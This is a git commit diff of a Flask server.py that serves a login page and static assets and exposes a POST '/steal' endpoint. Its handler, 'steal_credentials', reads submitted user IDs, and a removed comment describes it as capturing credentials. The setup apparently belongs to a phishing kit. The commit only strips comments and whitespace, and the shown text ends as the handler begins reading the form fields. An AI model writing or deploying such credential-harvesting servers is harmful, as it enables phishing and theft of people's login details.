9f35deebcc1c46de8a7f7fe21d7cc4371f9bfeae
muhammadwali0 <waleeraxa@gmail.com>
2025-10-09 10:56:03 -0700

    server.py

--- server.py
+++ server.py
@@ -2,22 +2,18 @@ from flask import Flask, request, send_from_directory
 
 app = Flask(__name__, static_url_path='')
 
-# Serve the main login page
 @app.route('/')
 def serve_index():
     return send_from_directory('.', 'index.html')
 
-# Serve files from ps folder (CSS, JS, images)
 @app.route('/ps/<path:filename>')
 def serve_ps(filename):
     return send_from_directory('ps', filename)
-
-# Serve files from psp folder (in case it's needed)
+    
 @app.route('/psp/<path:filename>')
 def serve_psp(filename):
     return send_from_directory('psp', filename)
 
-# Endpoint to capture credentials
 @app.route('/steal', methods=['POST'])
 def steal_credentials():
     user = request.form.get('userid')
